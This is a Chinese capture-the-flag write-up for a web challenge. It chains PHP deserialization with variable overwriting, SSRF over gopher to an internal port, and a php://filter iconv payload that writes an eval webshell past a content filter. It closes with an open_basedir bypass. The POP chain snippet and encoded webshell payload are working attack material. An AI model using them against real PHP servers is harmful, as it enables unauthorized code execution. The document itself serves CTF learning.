# half_infiltration

> 分类：Web

## 题目描述

PHP 反序列化 + SSRF（gopher 协议写 shell）+ open_basedir 绕过。

## 考察知识点

- PHP 反序列化（变量覆盖 global $$a）
- SSRF（gopher 协议）
- 伪协议写入绕过内容过滤
- open_basedir 绕过

## 解法

1. 源码存在反序列化 `unserialize($_GET['x'])->get_it()`，`__destruct` 中有三个关键点：`$student->$boy();`（调任意方法）、`global $$a;`（变量覆盖）、`ob_end_clean();`（拿不到输出）。

2. 构造 POP 链，用 `global $this` 出错让 `ob_end_clean` 无法清空缓冲区，从而获取输出：

```php
$b->age = $a;
$b->sex = 'read';
$b->num = 'result';
$c->age = $a;
$c->sex = 'read';
$c->num = 'this';
$d = serialize(array($b, $c));
```

3. ssrf.php 存在 SSRF（过滤 flag|var|apache|conf|proc|log），端口爆破发现内网 40000 端口开放。
4. 后端是 `file_put_contents($file, $content)`，过滤了 `<? ph`。
5. 用伪协议绕过内容过滤写 shell：

```
file=php://filter/convert.iconv.UCS-4LE.UCS-4*/resource=shell.php&content=hp?<   pave@_$(l[TEG]"a">?;)
```

6. cat flag 发现有 open_basedir 限制，用常规绕过方案读取 flag。

## 参考答案

（flag 通过写 shell + open_basedir 绕过读取）

## 来源

- 作者：一叶飘零 | https://www.4hou.com/posts/yMvW
